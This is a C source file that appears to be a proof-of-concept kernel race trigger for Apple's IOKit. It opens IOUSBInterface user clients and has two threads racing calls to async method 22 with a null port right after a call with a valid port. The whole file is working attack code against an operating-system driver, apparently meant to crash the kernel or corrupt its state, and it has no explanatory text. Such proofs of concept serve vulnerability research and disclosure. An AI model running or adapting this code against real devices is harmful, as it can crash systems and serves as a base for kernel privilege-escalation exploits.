#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/host_priv.h>
#include <IOKit/IOKitLib.h>

mach_port_t create_port()
{
	mach_port_t p = MACH_PORT_NULL;
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
	mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
	return p;
}

volatile boolean_t start = false;
volatile io_connect_t client;

void* racer(void* unused)
{
	while (!start) {;}

	IOConnectCallAsyncMethod(	client, 22, MACH_PORT_NULL, NULL, 0,
								NULL, 0, NULL, 0,
								NULL, NULL, NULL, NULL);

	return NULL;
}

int main(int argc, char** argv, char** envp)
{
	char* service_name = "IOUSBInterface";

	kern_return_t kr;
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
	if (service == IO_OBJECT_NULL)
	{
		printf("Unable to find service: %s\n", service_name);
		return -1;
	}

	for (int client_no = 0; client_no < 5; client_no++)
	{
		printf("Client %d\n", client_no);
		client = MACH_PORT_NULL;
		kr = IOServiceOpen(service, mach_task_self(), client_no, (io_connect_t*)&client);
		if (kr != KERN_SUCCESS)
		{
			printf("Unable to open client %d: %s\n", client_no, mach_error_string(kr));
			continue;
		}
		mach_port_t port = create_port();

		for (int i = 0; i < 100; i++)
		{
			IOConnectCallAsyncMethod(	client, 22, port, NULL, 0,
										NULL, 0, NULL, 0,
										NULL, NULL, NULL, NULL);

			start = false;
			int n_threads = 2;
			pthread_t threads[n_threads];
			for (int t = 0; t < n_threads; t++)
			{
				pthread_create(&(threads[t]), NULL, racer, NULL);
			}
			start = true;
			for(int t = 0; t < n_threads; t++)
			{
				pthread_join(threads[t], NULL);
			}
		}

		mach_port_destroy(mach_task_self(), port);
	}

	return 0;
}
